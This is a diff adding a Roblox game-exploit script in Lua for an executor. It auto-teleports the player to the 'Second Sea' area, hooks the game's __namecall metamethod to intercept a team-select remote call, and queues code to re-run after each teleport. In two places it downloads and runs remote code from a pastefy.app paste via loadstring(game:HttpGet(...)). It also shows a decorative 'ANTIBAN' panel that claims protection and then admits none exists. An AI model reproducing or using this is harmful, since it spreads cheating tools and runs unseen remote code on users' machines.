@@ -1,0 +1,456 @@
+-- ================== WAIT GAME ==================
+
+repeat task.wait() until game:IsLoaded()
+
+-- ================== SERVICES ==================
+
+local Players = game:GetService("Players")
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- ================== REMOTES ==================
+
+local ActivityRemote = ReplicatedStorage
+
+ :WaitForChild("Modules")
+
+ :WaitForChild("Net")
+
+ :WaitForChild("RE/OnEventServiceActivity")
+
+local CommF = ReplicatedStorage
+
+ :WaitForChild("Remotes")
+
+ :WaitForChild("CommF_")
+
+-- ================== QUEUE ON TELEPORT ==================
+
+local QUEUE_CODE = [[
+
+repeat task.wait() until game:IsLoaded()
+
+-- Bảng LOAD ANTIBAN riêng cho Delta Executor
+local gui = Instance.new("ScreenGui")
+gui.Name = "Load AntiBan"
+gui.Parent = game.CoreGui or game:GetService("CoreGui")
+
+-- ===== NÚT BẬT/TẮT (icon khiên) =====
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Size = UDim2.new(0, 45, 0, 45)
+toggleBtn.Position = UDim2.new(0, 70, 0, 100)  -- Đặt ở góc trái, cạnh icon kia
+toggleBtn.Text = "🛡️"
+toggleBtn.TextSize = 25
+toggleBtn.BackgroundColor3 = Color3.new(0.2, 0.4, 0.8)
+toggleBtn.BackgroundTransparency = 0.2
+toggleBtn.BorderSizePixel = 2
+toggleBtn.BorderColor3 = Color3.new(0.3, 0.6, 1)
+toggleBtn.TextColor3 = Color3.new(1, 1, 1)
+toggleBtn.Parent = gui
+
+-- ===== BẢNG ANTIBAN =====
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 250, 0, 120)
+frame.Position = UDim2.new(0.5, -125, 0.4, 0)
+frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.2)
+frame.BackgroundTransparency = 0.1
+frame.BorderSizePixel = 2
+frame.BorderColor3 = Color3.new(0.2, 0.5, 1)
+frame.Active = true
+frame.Draggable = true
+frame.Visible = false
+frame.Parent = gui
+
+-- ===== TIÊU ĐỀ =====
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 45)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.Text = "🛡️ LOAD ANTIBAN 🛡️"
+title.TextColor3 = Color3.new(0.3, 0.7, 1)
+title.TextScaled = true
+title.BackgroundTransparency = 1
+title.Parent = frame
+
+-- ===== CẢNH BÁO =====
+local warning = Instance.new("TextLabel")
+warning.Size = UDim2.new(1, 0, 0, 25)
+warning.Position = UDim2.new(0, 0, 0, 48)
+warning.Text = "⚠️ Wait Load ⚠️"
+warning.TextColor3 = Color3.new(1, 0.5, 0.2)
+warning.TextScaled = true
+warning.BackgroundTransparency = 1
+warning.Parent = frame
+
+-- ===== NÚT LOAD =====
+local loadBtn = Instance.new("TextButton")
+loadBtn.Size = UDim2.new(0.5, 0, 0, 35)
+loadBtn.Position = UDim2.new(0.25, 0, 0, 75)
+loadBtn.Text = "🔒 LOAD"
+loadBtn.BackgroundColor3 = Color3.new(0.2, 0.4, 0.8)
+loadBtn.TextColor3 = Color3.new(1, 1, 1)
+loadBtn.TextSize = 16
+loadBtn.BorderSizePixel = 0
+loadBtn.Parent = frame
+
+-- ===== THÔNG BÁO =====
+local notify = Instance.new("TextLabel")
+notify.Size = UDim2.new(0, 240, 0, 35)
+notify.Position = UDim2.new(1, -250, 0, 60)
+notify.Text = ""
+notify.TextColor3 = Color3.new(1, 1, 1)
+notify.BackgroundColor3 = Color3.new(0, 0, 0)
+notify.BackgroundTransparency = 0.5
+notify.TextSize = 13
+notify.Visible = false
+notify.Parent = gui
+
+local function showMessage(msg, isError)
+    notify.Text = msg
+    if isError then
+        notify.TextColor3 = Color3.new(1, 0.3, 0.3)
+    else
+        notify.TextColor3 = Color3.new(0.3, 1, 0.3)
+    end
+    notify.Visible = true
+    wait(2)
+    notify.Visible = false
+end
+
+loadBtn.MouseButton1Click:Connect(function()
+    showMessage("🛡️ ANTIBAN Loaded!", true)
+    wait(0.8)
+    showMessage("❌ No real antiban in Roblox ❌", true)
+end)
+
+local isOpen = false
+toggleBtn.MouseButton1Click:Connect(function()
+    isOpen = not isOpen
+    frame.Visible = isOpen
+    if isOpen then
+        toggleBtn.BackgroundColor3 = Color3.new(0.3, 0.7, 0.3)
+        toggleBtn.Text = "✖"
+    else
+        toggleBtn.BackgroundColor3 = Color3.new(0.2, 0.4, 0.8)
+        toggleBtn.Text = "🛡️"
+    end
+end)
+
+print("✅ AntiBan loaded - Click 🛡️ to open")
+loadstring(game:HttpGet(
+
+ "https://pastefy.app/NjJvZMLS/raw",
+
+ true
+
+))()
+
+]]
+
+pcall(function()
+
+ if queue_on_teleport then
+
+  queue_on_teleport(QUEUE_CODE)
+
+ elseif syn and syn.queue_on_teleport then
+
+  syn.queue_on_teleport(QUEUE_CODE)
+
+ end
+
+end)
+
+-- ================== CHECK MAP ==================
+
+local InSecondSea = false
+
+if workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Dressrosa") then
+
+ InSecondSea = true
+
+end
+
+-- ================== GLOBAL LOCK ==================
+
+_G.__STOP_OTHER_SCRIPTS__ = false
+
+-- =================================================
+
+-- =============== TP TO SECOND SEA ================
+
+-- =================================================
+
+if not InSecondSea then
+
+ -- ================== GUI ==================
+
+ local gui = Instance.new("ScreenGui")
+
+ gui.Name = "SecondSeaTPGui"
+
+ gui.ResetOnSpawn = false
+
+ gui.Parent = PlayerGui
+
+ gui.Enabled = false
+
+ local frame = Instance.new("Frame", gui)
+
+ frame.Size = UDim2.fromScale(0.42, 0.25)
+
+ frame.Position = UDim2.fromScale(0.29, 0.35)
+
+ frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+
+ frame.BorderSizePixel = 0
+
+ Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
+
+ local text = Instance.new("TextLabel", frame)
+
+ text.Size = UDim2.fromScale(1, 1)
+
+ text.BackgroundTransparency = 1
+
+ text.TextWrapped = true
+
+ text.TextScaled = true
+
+ text.Font = Enum.Font.GothamBold
+
+ text.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+ -- ================== TELEPORT ==================
+
+ local started = false
+
+ local function startTeleport()
+
+  if started then return end
+
+  started = true
+
+  _G.__STOP_OTHER_SCRIPTS__ = true
+
+  gui.Enabled = true
+
+  for i = 5, 1, -1 do
+
+   text.Text =
+
+    "Script only work on Second Sea.\n" ..
+
+    "We will tp you to Second Sea\n\n" ..
+
+    "TP in "..i.."s"
+
+   task.wait(1)
+
+  end
+
+  text.Text = "Teleporting..."
+
+  task.wait(0.3)
+
+  pcall(function()
+
+   CommF:InvokeServer("TravelDressrosa")
+
+  end)
+
+ end
+
+ -- ================== CONDITION B ==================
+
+ task.spawn(function()
+
+  repeat task.wait(0.1) until
+
+   _G.__STOP_OTHER_SCRIPTS__ or
+
+   not (
+
+    PlayerGui:FindFirstChild("Main (minimal)")
+
+    and PlayerGui["Main (minimal)"]:FindFirstChild("ChooseTeam")
+
+    and PlayerGui["Main (minimal)"].ChooseTeam:FindFirstChild("Container")
+
+    and PlayerGui["Main (minimal)"].ChooseTeam.Container:FindFirstChild("Pirates")
+
+   )
+
+  if not _G.__STOP_OTHER_SCRIPTS__ then
+
+   startTeleport()
+
+  end
+
+ end)
+
+ -- ================== CONDITION A ==================
+
+ local oldNamecall
+
+ oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+
+  if _G.__STOP_OTHER_SCRIPTS__ then
+
+   return oldNamecall(self, ...)
+
+  end
+
+  local method = getnamecallmethod()
+
+  local args = {...}
+
+  if not started
+
+   and self == ActivityRemote
+
+   and method == "FireServer"
+
+   and typeof(args[1]) == "string"
+
+   and args[1]:find("TeamSelect/Team/")
+
+  then
+
+   task.spawn(startTeleport)
+
+  end
+
+  return oldNamecall(self, ...)
+
+ end)
+
+ repeat task.wait() until _G.__STOP_OTHER_SCRIPTS__
+
+ return
+
+end
+
+-- =================================================
+
+-- ========== ĐANG Ở SECOND SEA → RUN SCRIPT =======
+
+-- =================================================
+
+-- Bảng LOAD ANTIBAN riêng cho Delta Executor
+local gui = Instance.new("ScreenGui")
+gui.Name = "Load AntiBan"
+gui.Parent = game.CoreGui or game:GetService("CoreGui")
+
+-- ===== NÚT BẬT/TẮT (icon khiên) =====
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Size = UDim2.new(0, 45, 0, 45)
+toggleBtn.Position = UDim2.new(0, 70, 0, 100)  -- Đặt ở góc trái, cạnh icon kia
+toggleBtn.Text = "🛡️"
+toggleBtn.TextSize = 25
+toggleBtn.BackgroundColor3 = Color3.new(0.2, 0.4, 0.8)
+toggleBtn.BackgroundTransparency = 0.2
+toggleBtn.BorderSizePixel = 2
+toggleBtn.BorderColor3 = Color3.new(0.3, 0.6, 1)
+toggleBtn.TextColor3 = Color3.new(1, 1, 1)
+toggleBtn.Parent = gui
+
+-- ===== BẢNG ANTIBAN =====
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 250, 0, 120)
+frame.Position = UDim2.new(0.5, -125, 0.4, 0)
+frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.2)
+frame.BackgroundTransparency = 0.1
+frame.BorderSizePixel = 2
+frame.BorderColor3 = Color3.new(0.2, 0.5, 1)
+frame.Active = true
+frame.Draggable = true
+frame.Visible = false
+frame.Parent = gui
+
+-- ===== TIÊU ĐỀ =====
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 45)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.Text = "🛡️ LOAD ANTIBAN 🛡️"
+title.TextColor3 = Color3.new(0.3, 0.7, 1)
+title.TextScaled = true
+title.BackgroundTransparency = 1
+title.Parent = frame
+
+-- ===== CẢNH BÁO =====
+local warning = Instance.new("TextLabel")
+warning.Size = UDim2.new(1, 0, 0, 25)
+warning.Position = UDim2.new(0, 0, 0, 48)
+warning.Text = "⚠️ Wait Load ⚠️"
+warning.TextColor3 = Color3.new(1, 0.5, 0.2)
+warning.TextScaled = true
+warning.BackgroundTransparency = 1
+warning.Parent = frame
+
+-- ===== NÚT LOAD =====
+local loadBtn = Instance.new("TextButton")
+loadBtn.Size = UDim2.new(0.5, 0, 0, 35)
+loadBtn.Position = UDim2.new(0.25, 0, 0, 75)
+loadBtn.Text = "🔒 LOAD"
+loadBtn.BackgroundColor3 = Color3.new(0.2, 0.4, 0.8)
+loadBtn.TextColor3 = Color3.new(1, 1, 1)
+loadBtn.TextSize = 16
+loadBtn.BorderSizePixel = 0
+loadBtn.Parent = frame
+
+-- ===== THÔNG BÁO =====
+local notify = Instance.new("TextLabel")
+notify.Size = UDim2.new(0, 240, 0, 35)
+notify.Position = UDim2.new(1, -250, 0, 60)
+notify.Text = ""
+notify.TextColor3 = Color3.new(1, 1, 1)
+notify.BackgroundColor3 = Color3.new(0, 0, 0)
+notify.BackgroundTransparency = 0.5
+notify.TextSize = 13
+notify.Visible = false
+notify.Parent = gui
+
+local function showMessage(msg, isError)
+    notify.Text = msg
+    if isError then
+        notify.TextColor3 = Color3.new(1, 0.3, 0.3)
+    else
+        notify.TextColor3 = Color3.new(0.3, 1, 0.3)
+    end
+    notify.Visible = true
+    wait(2)
+    notify.Visible = false
+end
+
+loadBtn.MouseButton1Click:Connect(function()
+    showMessage("🛡️ ANTIBAN Loaded!", true)
+    wait(0.8)
+    showMessage("❌ No real antiban in Roblox ❌", true)
+end)
+
+local isOpen = false
+toggleBtn.MouseButton1Click:Connect(function()
+    isOpen = not isOpen
+    frame.Visible = isOpen
+    if isOpen then
+        toggleBtn.BackgroundColor3 = Color3.new(0.3, 0.7, 0.3)
+        toggleBtn.Text = "✖"
+    else
+        toggleBtn.BackgroundColor3 = Color3.new(0.2, 0.4, 0.8)
+        toggleBtn.Text = "🛡️"
+    end
+end)
+
+print("✅ AntiBan loaded - Click 🛡️ to open")
+
+loadstring(game:HttpGet(
+
+ "https://pastefy.app/NjJvZMLS/raw",
+
+ true
+
+))()
